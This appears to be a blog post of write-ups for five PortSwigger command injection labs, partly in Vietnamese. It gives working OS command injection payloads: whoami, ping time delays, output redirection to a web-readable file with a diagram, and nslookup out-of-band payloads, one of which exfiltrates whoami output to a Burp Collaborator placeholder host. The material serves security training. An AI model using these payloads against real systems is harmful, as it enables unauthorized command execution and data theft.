---
layout: post
title: "Command injection"
render_with_liquid: false
categories:
  - Web Security
tags:
  - portswigger
  - command-injection
source_collection: notion_portswigger
---
Created by: Nguyễn Giang Nam
Topics: Server-side

# **Lab 01: OS command injection, simple case**

Sửa tham số `storeID` thành

```jsx
1|whoami
```

# **Lab 02: Blind OS command injection with time delays**

Thanh đổi tham số `email`

```jsx
email=x||ping+-c+10+127.0.0.1||
```

# **Lab 03: Blind OS command injection with output redirection**

```jsx
╔═══════════════════════════════════════════════════════════════════════╗
║                        FEEDBACK FORM REQUEST                          ║
╠═══════════════════════════════════════════════════════════════════════╣
║                                                                       ║
║  POST /feedback HTTP/2                                                ║
║  Host: vulnerable-website.com                                         ║
║  Content-Type: application/x-www-form-urlencoded                      ║
║                                                                       ║
║  csrf=xxx&name=test&email=test@test.com&subject=test&message=test     ║
║                     ▲                                                 ║
║                     │                                                 ║
║                     └── Injection point                               ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝

┌──────────┐                                           ┌─────────┐
│ Attacker │                                           │ Server  │
└────┬─────┘                                           └────┬────┘
     │                                                      │
     │  POST /feedback                                      │
     │  email=x||whoami>/var/www/images/out.txt||          │
     │─────────────────────────────────────────────────────>│
     │                                                      │
     │                              ┌───────────────────────┴──────┐
     │                              │ Shell executes:              │
     │                              │                              │
     │                              │ mail -s "Subject" x||whoami  │
     │                              │ >/var/www/images/out.txt||   │
     │                              │                              │
     │                              │ Command breakdown:           │
     │                              │ 1. mail -s "Subject" x → FAIL│
     │                              │ 2. || → run next if failed   │
     │                              │ 3. whoami > /var/.../out.txt │
     │                              │    → Writes "peter-xyz" to   │
     │                              │       out.txt                │
     │                              │                              │
     │                              │ Response: "Thank you"        │
     │                              │ (No output visible)          │
     │                              └───────────────────────┬──────┘
     │                                                      │
     │   200 OK "Thank you for feedback"                    │
     │<─────────────────────────────────────────────────────│
     │                                                      │
     │   (Output không hiển thị - BLIND!)                   │
     │                                                      │
     │  GET /image?filename=out.txt                         │
     │─────────────────────────────────────────────────────>│
     │                                                      │
     │                              ┌───────────────────────┴──────┐
     │                              │ Read: /var/www/images/out.txt│
     │                              │ Content: "peter-xyz"         │
     │                              └───────────────────────┬──────┘
     │                                                      │
     │   200 OK                                             │
     │   peter-xyz                                          │
     │<─────────────────────────────────────────────────────│
     │                                                      │
     │   ✓ Command output retrieved!                        │
     ▼                                                      ▼
```

# **Lab 04: Blind OS command injection with out-of-band interaction**

```jsx
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

# **Lab 05: Blind OS command injection with out-of-band data exfiltration**

```jsx
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```
